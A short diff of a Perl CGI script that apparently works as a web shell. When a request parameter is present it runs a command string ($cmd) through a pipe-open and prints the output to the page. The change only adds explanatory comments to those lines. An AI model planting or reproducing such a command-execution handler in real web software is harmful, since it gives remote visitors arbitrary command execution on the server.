@@ -31,11 +31,11 @@ if (param()){
 	print "command output is:<br> ";
 	print "<pre>";
 	$tmp = '';
-	if (!open($tmp, $cmd.'|') ) {
-		print 'error: '.$!."<br />\n";
+	if (!open($tmp, $cmd.'|') ) {		# execute $cmd and put output into $tmp variable
+		print 'error: '.$!."<br />\n"; 	# if there is no such command, error massage will be displayed
 		exit(0);
 	}
-	while (<$tmp>){
+	while (<$tmp>){			# while there is output in $tmp it will print this output
 		print $_;
 	}
 	print "</pre>";
